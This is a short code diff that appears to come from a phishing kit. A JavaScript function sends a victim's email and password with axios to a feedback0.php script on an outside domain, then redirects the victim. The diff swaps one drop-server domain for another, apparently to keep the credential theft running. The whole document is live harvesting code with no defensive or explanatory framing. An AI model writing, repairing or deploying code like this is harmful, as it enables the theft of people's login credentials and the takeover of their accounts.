@@ -67,7 +67,7 @@ function set(t, e) {
 
  function sendDetails(t, e, n) {
       var o = new FormData;
-      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://www.albanopoulou.gr/feedback0.php", o).then(function(t) {
+      o.append("email", t), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://www.ajcarchitecture.co.uk/feedback0.php", o).then(function(t) {
           200 === t.status && redirect(url_link)
       }).catch(function(t) {
           console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
